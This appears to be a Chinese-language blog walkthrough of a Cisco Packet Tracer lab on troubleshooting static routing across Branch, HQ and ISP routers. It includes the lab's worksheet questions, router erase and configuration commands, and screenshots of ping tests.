步骤 5    对 Branch 路由器上的静态路由配置进行故障排除。首先查看路由表。

路由表中显示有哪些网络？ </code></pre><p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    路由表是否有任何问题？ </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    如果路由表有任何问题，请记下用来修正配置错误的命令。 </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​    步骤 6    如果在上面记录了任何命令，请现在将这些命令应用于路由器配置。<br>​<br>    步骤 7    如果上一步对配置进行了更改，请再次查看路由表。</p>
<pre><code>路由表信息是否显示有任何配置错误？ _____________ 
如果回答是“有”，请再次对路由表进行故障排除。
步骤 8    再次 ping 各个主机。

在主机 PC1 上，是否能 ping 通 PC2？ _____________ 

在主机 PC1 上，是否能 ping 通 ISP LAN 上的 Web 服务器？ _____________ 

在主机 PC1 上，是否能 ping 通 HQ 的 Serial 0/0/0 接口？ _____________
任务 4：HQ 路由器故障排除

步骤 1    从连接到 HQ 路由器的主机开始排除故障。

在主机 PC2 上，是否能 ping 通 PC1？ _____________ 

在主机 PC2 上，是否能 ping 通 ISP LAN 上的 Web 服务器？ _____________ 

在主机 PC2 上，是否能 ping 通其默认网关？ _____________
步骤 2    接下来检查 HQ 路由器是否存在配置错误。首先查看该路由器上每个接口的状态信息摘要。</code></pre><p>​<br>​    这些接口的状态是否有任何问题？ </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    如果这些接口的状态有任何问题，请记下用来修正配置错误的命令。 </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​    步骤 3    如果在上面记录了任何命令，请现在将这些命令应用于路由器配置。<br>​<br>    步骤 4    如果上一步对配置进行了更改，请再次查看路由器接口的状态信息摘要。</p>
<pre><code>接口状态摘要信息是否显示有任何配置错误？ _____________ 
如果回答是“有”，请再次对接口的状态进行故障排除。
步骤 5    对 HQ 路由器上的静态路由配置进行故障排除。首先查看路由表。

路由表中显示有哪些网络？ </code></pre><p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    路由表是否有任何问题？ </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    如果路由表有任何问题，请记下用来修正配置错误的命令。 </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​    步骤 6    如果在上面记录了任何命令，请现在将这些命令应用于路由器配置。<br>​<br>    步骤 7     如果上一步对配置进行了更改，请再次查看路由表。</p>
<pre><code>路由表信息是否显示有任何配置错误？ _____________ 
如果回答是“有”，请再次对路由表进行故障排除。
步骤 8    再次 ping 各个主机。

在主机 PC2 上，是否能 ping 通 PC1？ _____________ 

在主机 PC2 上，是否能 ping 通 ISP 路由器的 Serial 0/0/1 接口？ _____________ 

在主机 PC1 上，是否能 ping 通 ISP LAN 上的 Web 服务器？ _____________
任务 5：ISP 路由器故障排除

步骤 1    从连接到 ISP 路由器的主机开始排除故障。

在模拟模式中，是否能从 ISP LAN 上的 Web 服务器 ping 通 PC1？ _____________ 

在模拟模式中，是否能从 ISP LAN 上的 Web 服务器 ping 通 PC2？ _____________ 

在模拟模式中，是否能从 ISP LAN 上的 Web 服务器 ping 通默认网关？ _____________
步骤 2    接下来检查 ISP 路由器是否存在配置错误。首先查看该路由器上每个接口的状态信息摘要。

这些接口的状态是否有任何问题？ </code></pre><p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    如果这些接口的状态有任何问题，请记下用来修正配置错误的命令。 </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​    步骤 3    如果在上面记录了任何命令，请现在将这些命令应用于路由器配置。<br>​<br>    步骤 4    如果上一步对配置进行了更改，请再次查看路由器接口的状态信息摘要。</p>
<pre><code>接口状态摘要信息是否显示有任何配置错误？ _____________ 
如果回答是“有”，请再次对接口的状态进行故障排除。
步骤 5    对 ISP 路由器上的静态路由配置进行故障排除。首先查看路由表。

路由表中显示有哪些网络？ </code></pre><p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    路由表是否有任何问题？ </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​<br>    如果路由表有任何问题，请记下用来修正配置错误的命令。 </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​    步骤 6    如果在上面记录了任何命令，请现在将这些命令应用于路由器配置。<br>​<br>    步骤 7    如果上一步对配置进行了更改，请再次查看路由表。</p>
<pre><code>路由表信息是否显示有任何配置错误？ _____________ 
如果回答是“有”，请再次对路由表进行故障排除。
步骤 8    再次 ping 各个主机。

在模拟模式中，是否能从 ISP LAN 上的 Web 服务器 ping 通 PC1？ _____________ 

在模拟模式中，是否能从 ISP LAN 上的 Web 服务器 ping 通 PC2？ _____________ 

在模拟模式中，是否能从 ISP LAN 上的 Web 服务器 ping 通 Branch 路由器的 WAN 接口？ _____________
任务 6：思考题

本次实验中提供的脚本存在多处配置错误。请在下列位置简要写出您找到的错误。 </code></pre><p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    在本任务结束时，您的完成率应该是 100%。如果完成率不是 100%，单击 Check Results（检查结果）按钮进行检查，必要时进行故障排除。</p>
<p>以上全部都是题目的要求，这里面其实我们只要关注这里面的完成度到100就行了。</p>
<p>首先一步一步的来</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390645701.png" data-fancybox="group" data-caption="1545390645701" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390645701.png" alt="1545390645701" title="1545390645701"></a></p>
<p>首先是连线</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390748878.png" data-fancybox="group" data-caption="1545390748878" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390748878.png" alt="1545390748878" title="1545390748878"></a></p>
<p>如图我们连接好了线路，这个时候我们还没有配置IP地址，但是这时候完成度已经10%了。</p>
<p>接着下一步，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390798741.png" data-fancybox="group" data-caption="1545390798741" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390798741.png" alt="1545390798741" title="1545390798741"></a></p>
<p>这里面我们把第二步还有第三步一块加起来进行说，IP地址怎么配置这个不用说了吧！</p>
<p>第二步是说清楚配置然后用reload重启路由器。这里面我们要注意告诉我们路由器的密码是class</p>
<p>我们先进去hq这个路由器配置这个其他的都一样，自行实践。</p>
<pre><code>HQ&gt;enable 
Password: 
HQ#era
HQ#erase s
HQ#erase startup-config 
Erasing the nvram filesystem will remove all configuration files! Continue? [confirm]y[OK]
Erase of nvram: complete
%SYS-7-NV_BLOCK_INIT: Initialized the geometry of nvram
HQ#reload
Proceed with reload? [confirm]n</code></pre><p>这里面是清除的过程。</p>
<p>全部清除完毕之后我们进行IP地址的配置。</p>
<p>记得要在配置完IP地址之后开启端口 NO SHUTDOWN</p>
<p>然后我们配置完IP地址之后这时候进度已经飙升到78%了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391294573.png" data-fancybox="group" data-caption="1545391294573" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391294573.png" alt="1545391294573" title="1545391294573"></a></p>
<p>继续进行，就是加载它的脚本了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391321422.png" data-fancybox="group" data-caption="1545391321422" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391321422.png" alt="1545391321422" title="1545391321422"></a></p>
<pre><code>Branch(config-if)#exit
Branch(config)#hostname Branch
Branch(config)#!
Branch(config)#!
Branch(config)#no ip domain-lookup
Branch(config)#!
Branch(config)#interface FastEthernet0/0
Branch(config-if)# ip address 172.20.1.129 255.255.255.128
Branch(config-if)# duplex auto
Branch(config-if)# speed auto
Branch(config-if)# no shutdown
Branch(config-if)#!
Branch(config-if)#interface Serial0/0/0
Branch(config-if)# ip address 172.20.1.1 255.255.255.128
Branch(config-if)# clock rate 64000
Branch(config-if)# no shutdown
Branch(config-if)#!
Branch(config-if)#ip route 0.0.0.0 0.0.0.0 172.20.0.129
Branch(config)#!
Branch(config)#!
Branch(config)#!
Branch(config)#!
Branch(config)#line con 0
Branch(config-line)#line vty 0 4
Branch(config-line)#password cisco
Branch(config-line)# login
Branch(config-line)#!
Branch(config-line)#end
Branch#
%SYS-5-CONFIG_I: Configured from console by console

Branch#</code></pre><p>这个玩意复制粘贴就行了，记住是全局模式。</p>
<p>HQ#这个是特权模式</p>
<p>HQ#(config)这个是全局</p>
<p>HQ#(config-if)这个是端口配置</p>
<p>其他的两个都一样。</p>
<p>这三个脚本都加载完了我们的进度就已经到了91%了哎，多开心！</p>
<p>继续进行任务三了，就是排除故障，那么我们用ICMP的包看看排除吧！</p>
<p>我们知道PING命令就是发出的ICMP包，我们PING试一试，看看题目的要求OK不OK</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391570118.png" data-fancybox="group" data-caption="1545391570118" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391570118.png" alt="1545391570118" title="1545391570118"></a></p>
<p>他叫我们Ping pc2 啊 服务器啊这个我们动动脑子都能想明白肯定Ping不通因为有问题吗，但是为了以防万一还是要Ping一下，我们看超时。这里他叫我们Ping网关，这个现在而言猜测应该是Ping的通的，因为这个题是说路由的问题吗，应该问题不会出在我们内网这一段。</p>
<p>我们ping网关</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391697746.png" data-fancybox="group" data-caption="1545391697746" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545391697746.png" alt="1545391697746" title="1545391697746"></a></p>
<p>我们看没问题啊，这就说明我们到路由器这一段根本没问题！</p>
<p>然后继续向下进行啊，那么我们就要说是哪里出现的问题了。</p>
<p>开启监控模式，我们在PC1发一个包到PC试一试！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392093068.png" data-fancybox="group" data-caption="1545392093068" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392093068.png" alt="1545392093068" title="1545392093068"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392180703.png" data-fancybox="group" data-caption="1545392180703" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392180703.png" alt="1545392180703" title="1545392180703"></a></p>
